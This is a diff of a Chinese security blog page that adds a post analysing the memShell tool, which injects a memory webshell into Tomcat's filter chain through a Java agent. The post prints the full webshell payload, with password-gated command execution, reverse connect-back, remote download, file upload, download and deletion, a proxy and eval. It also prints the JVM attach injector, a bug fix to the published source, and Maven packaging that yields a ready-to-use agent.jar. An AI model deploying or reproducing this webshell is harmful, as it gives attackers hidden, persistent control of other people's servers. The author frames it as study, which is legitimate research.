@@ -6,17 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | huahua&#39;s Blog</title>
+  <title>memshell源码解析 | huahua&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Java RedTeam C2">
-<meta property="og:type" content="website">
-<meta property="og:title" content="huahua&#39;s Blog">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="前言最近学习内存马，发现目前内存马主要集中在三个层面，1、原生的Servlet&#x2F;Filter  2、框架封装的控制器 3、jvm层面(rebeyond的memshell，目前已集成在最新版冰蝎中)。前两种其实听的比较多，第三种听的比较少，研究了一下发现比较有意思，又学到了一个知识点。本文主要分析第三种内存马，以memshell工具为例。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="memshell源码解析">
+<meta property="og:url" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/index.html">
 <meta property="og:site_name" content="huahua&#39;s Blog">
-<meta property="og:description" content="Java RedTeam C2">
+<meta property="og:description" content="前言最近学习内存马，发现目前内存马主要集中在三个层面，1、原生的Servlet&#x2F;Filter  2、框架封装的控制器 3、jvm层面(rebeyond的memshell，目前已集成在最新版冰蝎中)。前两种其实听的比较多，第三种听的比较少，研究了一下发现比较有意思，又学到了一个知识点。本文主要分析第三种内存马，以memshell工具为例。">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210606085955810.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210606090320747.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210607000829403.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608100355262.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608100212528.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608102129534.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608102055308.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608102433808.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608103113363.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608103419455.png">
+<meta property="og:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608103453669.png">
+<meta property="article:published_time" content="2021-06-09T03:10:51.000Z">
+<meta property="article:modified_time" content="2021-06-08T02:40:10.060Z">
 <meta property="article:author" content="huahua">
+<meta property="article:tag" content="工具分析">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210606085955810.png">
   
     <link rel="alternative" href="/atom.xml" title="huahua&#39;s Blog" type="application/atom+xml">
   
@@ -152,36 +167,106 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-memshell源码解析" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-06-09T03:10:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/">memshell源码解析</a>
+    <h1 class="article-title" itemprop="name">
+      memshell源码解析
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2021-06-09T03:10:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近学习内存马，发现目前内存马主要集中在三个层面，1、原生的Servlet/Filter  2、框架封装的控制器 3、jvm层面(rebeyond的memshell，目前已集成在最新版冰蝎中)。前两种其实听的比较多，第三种听的比较少，研究了一下发现比较有意思，又学到了一个知识点。本文主要分析第三种内存马，以<a target="_blank" rel="noopener" href="https://github.com/rebeyond/memShell">memshell</a>工具为例。</p>
+<span id="more"></span>
+
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>该工具分为两块，Agent.jar和Inject.jar，Agent.jar为一个attach类型的java agent。Inject.jar为将Agent.jar attach到tomcat的jvm上的程序。</p>
+<p>首先看Agent部分代码</p>
+<p>Agent.java</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210606085955810.png" alt="image-20210606085955810"></p>
+<p>Agent.java前半部分的代码为添加类转换的方法，找到org.apache.catalina.core.ApplicationFilterChain类进行类转换，具体怎么转化内的可以看Transformer类的transform()方法。</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210606090320747.png" alt="image-20210606090320747"></p>
+<p>看上图可知，transform获取到org.apache.catalina.core.ApplicationFilterChain的ClassLoader，类名，Class，ProtectionDomain，字节数组。然后使用javaassit将org.apache.catalina.core.ApplicationFilterChain的internalDoFilter方法中插入自定义的代码，对应上图代码中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.insertBefore(readSource())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210607000829403.png" alt="image-20210607000829403"></p>
+<p>source.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">	javax.servlet.http.HttpServletRequest request&#x3D;$1;</span><br><span class="line">	javax.servlet.http.HttpServletResponse response &#x3D; $2;</span><br><span class="line">	String pass_the_world&#x3D;request.getParameter(&quot;pass_the_world&quot;);</span><br><span class="line">	String model&#x3D;request.getParameter(&quot;model&quot;);</span><br><span class="line">	String result&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">			if (pass_the_world!&#x3D;null&amp;&amp;pass_the_world.equals(net.rebeyond.memshell.Agent.password))</span><br><span class="line">			&#123;</span><br><span class="line">				if (model&#x3D;&#x3D;null||model.equals(&quot;&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.help();</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;exec&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String cmd&#x3D;request.getParameter(&quot;cmd&quot;);</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.execute(cmd);</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;connectback&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String ip&#x3D;request.getParameter(&quot;ip&quot;);</span><br><span class="line">					String port&#x3D;request.getParameter(&quot;port&quot;);</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.connectBack(ip, port);</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;urldownload&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String url&#x3D;request.getParameter(&quot;url&quot;);</span><br><span class="line">					String path&#x3D;request.getParameter(&quot;path&quot;);</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.urldownload(url, path);</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;list&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String path&#x3D;request.getParameter(&quot;path&quot;);</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.list(path);</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;del&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String path&#x3D;request.getParameter(&quot;path&quot;);</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.delete(path);</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;show&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String path&#x3D;request.getParameter(&quot;path&quot;);</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.showFile(path);</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;download&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String path&#x3D;request.getParameter(&quot;path&quot;);</span><br><span class="line">					java.io.File f &#x3D; new java.io.File(path);</span><br><span class="line">					if (f.isFile()) &#123;</span><br><span class="line">						String fileName &#x3D; f.getName();</span><br><span class="line">						java.io.InputStream inStream &#x3D; new java.io.FileInputStream(path);</span><br><span class="line">						response.reset();</span><br><span class="line">						response.setContentType(&quot;bin&quot;);</span><br><span class="line">						response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;\&quot;&quot; + fileName + &quot;\&quot;&quot;);</span><br><span class="line">						byte[] b &#x3D; new byte[100];</span><br><span class="line">						int len;</span><br><span class="line">							while ((len &#x3D; inStream.read(b)) &gt; 0)</span><br><span class="line">								response.getOutputStream().write(b, 0, len);</span><br><span class="line">							inStream.close();</span><br><span class="line">							return;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;upload&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					String path&#x3D;request.getParameter(&quot;path&quot;);</span><br><span class="line">					String fileContent&#x3D;request.getParameter(&quot;content&quot;);</span><br><span class="line">					String type&#x3D;request.getParameter(&quot;type&quot;);</span><br><span class="line">					if (type&#x3D;&#x3D;null||!type.equalsIgnoreCase(&quot;b&quot;))</span><br><span class="line">						type&#x3D;&quot;a&quot;;</span><br><span class="line">					result&#x3D;net.rebeyond.memshell.Shell.upload(path, fileContent,type);</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;proxy&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					new net.rebeyond.memshell.Proxy().doProxy(request, response);</span><br><span class="line">					return;</span><br><span class="line">				&#125;</span><br><span class="line">				else if (model.equalsIgnoreCase(&quot;chopper&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					new net.rebeyond.memshell.Evaluate().doPost(request, response);</span><br><span class="line">					return;</span><br><span class="line">				&#125;</span><br><span class="line">				response.getWriter().print(result);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		catch(Exception e)</span><br><span class="line">		&#123;</span><br><span class="line">			response.getWriter().print(e.getMessage());</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到各种功能性的代码被插入到了org.apache.catalina.core.ApplicationFilterChain的Filter中。因此，之后每段通过tomcat filter的请求都会被执行memshell的功能代码。</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608100355262.png" alt="image-20210608100355262"></p>
+<p>而至于Agent.java中得下图的try代码，主要是做一些删除jar包操作，不是agent其内存马作用的逻辑。</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608100212528.png" alt="image-20210608100212528"></p>
+<p>然后再看Inject.jar的内容</p>
+<p>对应源码的Attach.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if (args.length !&#x3D; 1) &#123;</span><br><span class="line">			System.out.println(&quot;Usage:java -jar inject.jar password&quot;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		VirtualMachine vm &#x3D; null;</span><br><span class="line">		List&lt;VirtualMachineDescriptor&gt; vmList &#x3D; null;</span><br><span class="line">		String password &#x3D; args[0];</span><br><span class="line">		String currentPath &#x3D; Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();</span><br><span class="line">		currentPath &#x3D; currentPath.substring(0, currentPath.lastIndexOf(&quot;&#x2F;&quot;) + 1);</span><br><span class="line">		String agentFile &#x3D; currentPath + &quot;agent.jar&quot;;</span><br><span class="line">		agentFile &#x3D; new File(agentFile).getCanonicalPath();</span><br><span class="line">		String agentArgs &#x3D; currentPath;</span><br><span class="line">		if (!password.equals(&quot;&quot;) || password !&#x3D; null) &#123;</span><br><span class="line">			agentArgs &#x3D; agentArgs + &quot;^&quot; + password;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上代码获取命令行输入的password和当前文件位置，并将两者拼接为agentArgs，留做后续转给agent.jar。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">while (true) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			vmList &#x3D; VirtualMachine.list();</span><br><span class="line">			if (vmList.size() &lt;&#x3D; 0)</span><br><span class="line">				continue;</span><br><span class="line">			for (VirtualMachineDescriptor vmd : vmList) &#123;</span><br><span class="line">				if (vmd.displayName().indexOf(&quot;catalina&quot;) &gt;&#x3D; 0||vmd.displayName().equals(&quot;&quot;)) &#123;</span><br><span class="line">					vm &#x3D; VirtualMachine.attach(vmd);</span><br><span class="line">					</span><br><span class="line">					&#x2F;&#x2F;ADD for tomcat windows service,dispayname is blank string and has key &quot;catalina.home&quot;.</span><br><span class="line">					if (vmd.displayName().equals(&quot;&quot;)&amp;&amp;vm.getSystemProperties().containsKey(&quot;catalina.home&quot;)&#x3D;&#x3D;false)</span><br><span class="line">						continue;</span><br><span class="line">					</span><br><span class="line">					System.out.println(&quot;[+]OK.i find a jvm.&quot;);</span><br><span class="line">					Thread.sleep(1000);</span><br><span class="line">					if (null !&#x3D; vm) &#123;</span><br><span class="line">						vm.loadAgent(agentFile, agentArgs);</span><br><span class="line">						System.out.println(&quot;[+]memeShell is injected.&quot;);</span><br><span class="line">						vm.detach();</span><br><span class="line">						return;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			Thread.sleep(3000);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述代码在所有的jvm中寻找tomcat的jvm，然后将agent.jar attach到tomcat的jvm上。就会运行agent.jar中Agent.java中的agentmain方法逻辑，最后打上jvm层面的内存马。</p>
+<h3 id="排坑"><a href="#排坑" class="headerlink" title="排坑"></a>排坑</h3><p>1、如果缺少VirtualMachine类,请将jre/lib中的tools.jar加入CLASSPATH</p>
+<p>2、作者github上传的源码有点问题，发布的jar包是没问题的，可能发布源码时忘了改了。</p>
+<p>具体就是将Transformer.java中的部分代码修改就没问题了</p>
+<p>原本：</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608102129534.png" alt="image-20210608102129534"></p>
+<p>修改后：</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608102055308.png" alt="image-20210608102055308"></p>
+<p>原因是因为transform的Class参数如果是类加载的话则为空，如果是重定义或重转发不为空。我们是用Agent.java中的inst.retransformClasses(c);来重转发这个类的。</p>
+<p>而如果class类为空，然后又执行了new ClassClassPath(aClass)，后续会报错空指针，程序就异常了，因此要加一个判断是否为空的逻辑。</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608102433808.png" alt="image-20210608102433808"></p>
+<p>3、打包</p>
+<p>之前一直对打包这个东西不太了解，这次打包这个项目打包了很久，我是用maven打包的，直接贴出我的pom.xml吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line">  &lt;groupId&gt;ParaShell&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;ParaShell&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;0.0.1-SNAPSHOT&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;resources&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;lib&lt;&#x2F;directory&gt;</span><br><span class="line">                &lt;filtering&gt;false&lt;&#x2F;filtering&gt;</span><br><span class="line">            &lt;&#x2F;resource&gt;</span><br><span class="line">    &lt;&#x2F;resources&gt;</span><br><span class="line">        &lt;sourceDirectory&gt;src&lt;&#x2F;sourceDirectory&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-assembly-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;archive&gt;</span><br><span class="line">                        &lt;manifestEntries&gt;</span><br><span class="line">                            &lt;!-- 主要改这个配置项 --&gt;</span><br><span class="line">                            &lt;Agent-Class&gt;net.rebeyond.memshell.Agent&lt;&#x2F;Agent-Class&gt;</span><br><span class="line">                            &lt;Can-Redefine-Classes&gt;true&lt;&#x2F;Can-Redefine-Classes&gt;</span><br><span class="line">                            &lt;Can-Retransform-Classes&gt;true&lt;&#x2F;Can-Retransform-Classes&gt;</span><br><span class="line">                        &lt;&#x2F;manifestEntries&gt;</span><br><span class="line">                    &lt;&#x2F;archive&gt;</span><br><span class="line">                    &lt;descriptorRefs&gt;</span><br><span class="line">                        &lt;descriptorRef&gt;jar-with-dependencies&lt;&#x2F;descriptorRef&gt;</span><br><span class="line">                    &lt;&#x2F;descriptorRefs&gt;</span><br><span class="line">                &lt;&#x2F;configuration&gt;</span><br><span class="line">            &lt;&#x2F;plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;source&gt;6&lt;&#x2F;source&gt;</span><br><span class="line">                    &lt;target&gt;6&lt;&#x2F;target&gt;</span><br><span class="line">                &lt;&#x2F;configuration&gt;</span><br><span class="line">            &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;&#x2F;plugins&gt;</span><br><span class="line">    &lt;&#x2F;build&gt;</span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">  &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.javassist&#x2F;javassist --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.22.0-GA&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt;</span><br><span class="line">      &lt;version&gt;3.0.1&lt;&#x2F;version&gt;</span><br><span class="line">      &lt;scope&gt;provided&lt;&#x2F;scope&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">      &lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;dingding&lt;&#x2F;groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;dingding&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;2.8&lt;&#x2F;version&gt;</span><br><span class="line">          &lt;scope&gt;system&lt;&#x2F;scope&gt;</span><br><span class="line">          &lt;systemPath&gt;$&#123;project.basedir&#125;&#x2F;lib&#x2F;tools.jar&lt;&#x2F;systemPath&gt;</span><br><span class="line">      &lt;&#x2F;dependency&gt;</span><br><span class="line">    &lt;&#x2F;dependencies&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>
+
+<p>lib里面放了一个source.txt，注意这里我打包的是Agent.jar，其实都不需要tools.jar的，只不过我懒得删了。打包用了maven的jar-with-dependencies，会把依赖的jar包以class的形式和程序的class封装在一个jar包里，该jar包名称以jar-with-dependencies结尾。</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608103113363.png" alt="image-20210608103113363"></p>
+<p>然后在pom.xml目录执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn assembly:assembly</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608103419455.png" alt="image-20210608103419455"></p>
+<p>解压jar-with-dependencies后的目录结构，这样的agent.jar就可以直接使用了</p>
+<p><img src="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/image-20210608103453669.png" alt="image-20210608103453669"></p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>昨天有朋友和我说看了我的博客，以前一直以为没人看我的博客，所以写的基本上都是自己记录类型的，也没想着写的很清晰，自己能看懂就行了。因此，后面还是尽量写的清晰一些，毕竟挂在互联网上了，需要对读者负责。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -193,364 +278,105 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
